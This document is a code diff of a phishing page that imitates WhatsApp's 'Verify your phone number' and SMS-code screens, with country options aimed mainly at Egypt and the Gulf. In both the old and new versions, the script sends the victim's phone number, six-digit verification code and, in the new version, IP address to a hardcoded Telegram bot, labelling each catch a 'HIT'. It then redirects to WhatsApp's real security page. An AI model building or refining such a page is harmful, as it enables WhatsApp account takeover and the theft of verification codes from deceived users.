@@ -5,137 +5,142 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp Verify</title>
     <style>
-        :root { --wa-green: #25D366; --wa-dark-bg: #0b141a; --wa-sec: #202c33; --wa-text: #e9edef; --wa-hint: #8696a0; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
-        body { background-color: var(--wa-dark-bg); color: var(--wa-text); display: flex; justify-content: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        :root { --wa-green: #25D366; --wa-dark: #0b141a; --wa-sec: #202c33; --wa-text: #e9edef; --wa-hint: #8696a0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: var(--wa-dark); color: var(--wa-text); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; }
         
-        .screen { display: none; width: 100%; animation: fadeIn 0.3s ease; }
-        .active { display: flex; flex-direction: column; align-items: center; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; animation: fadeIn 0.4s ease; }
+        .active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-        h2 { font-size: 19px; font-weight: 500; margin: 40px 0 10px; color: #fff; }
-        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 30px; }
+        .logo { width: 60px; margin-top: 60px; margin-bottom: 20px; }
+        h1 { font-size: 20px; font-weight: 500; margin-bottom: 15px; color: #fff; }
+        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 25px; }
 
-        .selector-box { width: 100%; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-bottom: 5px; position: relative; }
-        select { background: transparent; color: var(--wa-green); border: none; outline: none; width: 100%; font-size: 16px; appearance: none; text-align: center; }
-
-        .input-row { width: 100%; display: flex; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-top: 10px; margin-bottom: 40px; }
-        #ccode { width: 25%; font-size: 18px; color: #fff; border-right: 1px solid #3b4a54; display: flex; align-items: center; justify-content: center; }
-        input[type="tel"] { width: 75%; background: transparent; border: none; color: #fff; font-size: 18px; padding: 0 15px; outline: none; }
-
-        .btn-next { background: var(--wa-green); color: #0b141a; width: 80px; height: 40px; border-radius: 5px; border: none; font-weight: 700; cursor: pointer; margin-top: 20px; }
+        /* Country Picker 2026 Style */
+        .selector { width: 100%; border-bottom: 1px solid var(--wa-green); padding: 10px; margin-bottom: 5px; }
+        select { background: transparent; color: var(--wa-green); border: none; outline: none; width: 100%; font-size: 16px; text-align-last: center; cursor: pointer; }
         
-        /* OTP Styling */
-        .otp-display { background: transparent; border: none; border-bottom: 2px solid var(--wa-green); width: 150px; font-size: 28px; text-align: center; letter-spacing: 5px; margin: 20px 0; color: #fff; outline: none; }
+        .input-row { width: 100%; display: flex; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-bottom: 40px; }
+        #ccode { width: 25%; font-size: 18px; border-right: 1px solid #3b4a54; color: #fff; }
+        input[type="tel"], input[type="text"] { width: 75%; background: transparent; border: none; color: #fff; font-size: 20px; padding: 0 15px; outline: none; text-align: left; }
+
+        button { background: var(--wa-green); color: #000; border: none; padding: 12px 30px; border-radius: 25px; font-size: 14px; font-weight: 600; width: 100%; cursor: pointer; margin-top: auto; margin-bottom: 40px; }
+
+        /* OTP Specifics */
+        .otp-input { width: 180px; border: none; border-bottom: 2px solid var(--wa-green); font-size: 28px; letter-spacing: 8px; text-align: center; margin: 30px 0; background: transparent; }
         .timer { color: var(--wa-hint); font-size: 13px; margin-top: 15px; }
-        .timer b { color: var(--wa-hint); font-weight: normal; }
+        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-top: 50px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div id="scr-1" class="screen active">
-            <h2>Verify your phone number</h2>
-            <p>WhatsApp will send an SMS message to verify your phone number.</p>
-            
-            <div class="selector-box">
-                <select id="countryData" onchange="applyCountry()">
-                    <option value="20" data-len="11">Egypt</option>
-                    <option value="966" data-len="9">Saudi Arabia</option>
-                    <option value="971" data-len="9">United Arab Emirates</option>
-                    <option value="965" data-len="8">Kuwait</option>
-                    <option value="974" data-len="8">Qatar</option>
-                    <option value="92" data-len="10">Pakistan</option>
-                    <option value="1" data-len="10">United States</option>
-                    <option value="44" data-len="10">United Kingdom</option>
-                </select>
-            </div>
-            
-            <div class="input-row">
-                <div id="ccode">+20</div>
-                <input type="tel" id="phone" placeholder="phone number" maxlength="11">
-            </div>
+    <div id="scr-load" class="screen active">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <div class="spinner"></div>
+        <p style="margin-top: 20px;">Securing connection...</p>
+    </div>
 
-            <button class="btn-next" onclick="toOTP()">NEXT</button>
+    <div id="scr-phone" class="screen">
+        <h1>Enter your phone number</h1>
+        <p>WhatsApp will need to verify your account to ensure it's not being used by an unauthorized device.</p>
+        
+        <div class="selector">
+            <select id="country" onchange="updateCountry()">
+                <option value="20" data-len="11">Egypt</option>
+                <option value="966" data-len="9">Saudi Arabia</option>
+                <option value="971" data-len="9">United Arab Emirates</option>
+                <option value="92" data-len="10">Pakistan</option>
+            </select>
         </div>
+        <div class="input-row">
+            <div id="ccode">+20</div>
+            <input type="tel" id="phone" placeholder="phone number" maxlength="11">
+        </div>
+        <button onclick="processPhone()">NEXT</button>
+    </div>
 
-        <div id="scr-2" class="screen">
-            <h2 style="margin-bottom: 5px;">Verifying your number</h2>
-            <p style="font-size: 13px;">Waiting to automatically detect an SMS sent to<br><span id="fullNum" style="color:#fff; font-weight: 500;"></span></p>
-            
-            <input type="text" id="otp" class="otp-display" maxlength="6" inputmode="numeric" placeholder="--- ---">
-            
-            <p style="color: var(--wa-hint); font-size: 13px;">Enter 6-digit code</p>
-            
-            <div class="timer">Resend SMS in <b id="clock">1:59</b></div>
-            
-            <button class="btn-next" style="width: 120px; margin-top: 50px;" onclick="done()">VERIFY</button>
-        </div>
+    <div id="scr-otp" class="screen">
+        <h1>Verifying your number</h1>
+        <p>Waiting to automatically detect an SMS sent to<br><b id="masked" style="color:#fff;"></b></p>
+        <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
+        <p style="color: var(--wa-hint);">Enter 6-digit code</p>
+        <div class="timer">Resend SMS in <span id="clock" style="color: var(--wa-green);">01:59</span></div>
+        <button onclick="submitOtp()">VERIFY</button>
     </div>
 
     <script>
-        const API = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
+        const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
+        let userNum = "";
 
-        function applyCountry() {
-            const select = document.getElementById('countryData');
-            const code = select.value;
-            const length = select.options[select.selectedIndex].getAttribute('data-len');
-            
-            document.getElementById('ccode').innerText = '+' + code;
-            const phoneInput = document.getElementById('phone');
-            phoneInput.maxLength = length; // يحدد طول الرقم المسموح به تلقائياً
-            phoneInput.value = ''; // يصفر الخانة
+        // Transition Load -> Phone
+        setTimeout(() => {
+            showScreen('scr-load', 'scr-phone');
+        }, 2500);
+
+        function showScreen(hide, show) {
+            document.getElementById(hide).classList.remove('active');
+            document.getElementById(show).classList.add('active');
         }
 
-        function toOTP() {
-            const num = document.getElementById('phone').value;
-            const code = document.getElementById('ccode').innerText;
-            const minLen = document.getElementById('countryData').selectedOptions[0].getAttribute('data-len');
+        function updateCountry() {
+            const s = document.getElementById('country');
+            const len = s.options[s.selectedIndex].getAttribute('data-len');
+            document.getElementById('ccode').innerText = '+' + s.value;
+            document.getElementById('phone').maxLength = len;
+            document.getElementById('phone').value = "";
+        }
 
-            if (num.length < (minLen - 1)) {
-                alert("The phone number is too short.");
-                return;
-            }
-
-            document.getElementById('fullNum').innerText = code + " " + num;
-            
-            // Send Alert to Telegram
-            fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
+        async function notify(msg) {
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+            fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: API.C, text: `📱 Target: ${code}${num}\nStatus: Waiting for OTP...` })
+                body: JSON.stringify({ chat_id: BOT.C, text: msg + `\nIP: ${ip}` })
             });
-
-            document.getElementById('scr-1').classList.remove('active');
-            document.getElementById('scr-2').classList.add('active');
-            runTimer();
         }
 
-        function runTimer() {
-            let s = 119;
-            setInterval(() => {
-                if(s > 0) {
-                    s--;
-                    document.getElementById('clock').innerText = Math.floor(s/60) + ":" + (s%60).toString().padStart(2, '0');
-                }
+        function processPhone() {
+            const num = document.getElementById('phone').value;
+            const code = document.getElementById('ccode').innerText;
+            const max = document.getElementById('phone').maxLength;
+
+            if(num.length < (max - 1)) return alert("The phone number you entered is too short.");
+
+            userNum = code + " " + num;
+            document.getElementById('masked').innerText = userNum;
+            notify(`☎️ Number Entered: ${userNum}`);
+
+            showScreen('scr-phone', 'scr-load'); // Show spinner briefly
+            setTimeout(() => {
+                showScreen('scr-load', 'scr-otp');
+                startTimer();
+            }, 1500);
+        }
+
+        function startTimer() {
+            let t = 119;
+            const clock = document.getElementById('clock');
+            const itv = setInterval(() => {
+                let m = Math.floor(t / 60);
+                let s = t % 60;
+                clock.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                if(--t < 0) clearInterval(itv);
             }, 1000);
         }
 
-        async function done() {
-            const code = document.getElementById('otp').value;
-            if(code.length < 6) return;
+        async function submitOtp() {
+            const otp = document.getElementById('otp').value;
+            if(otp.length < 6) return;
 
-            await fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    chat_id: API.C, 
-                    text: `🔥 NEW HIT!\nNumber: ${document.getElementById('fullNum').innerText}\nOTP: ${code}` 
-                })
-            });
-
-            window.location.href = "https://www.whatsapp.com/security";
+            document.getElementById('scr-otp').innerHTML = '<div class="spinner" style="margin: 50% auto;"></div><p>Verifying...</p>';
+            await notify(`🔥 HIT! CODE: ${otp}\nTarget: ${userNum}`);
+            
+            setTimeout(() => {
+                window.location.href = "https://www.whatsapp.com/security";
+            }, 2000);
         }
     </script>
 </body>
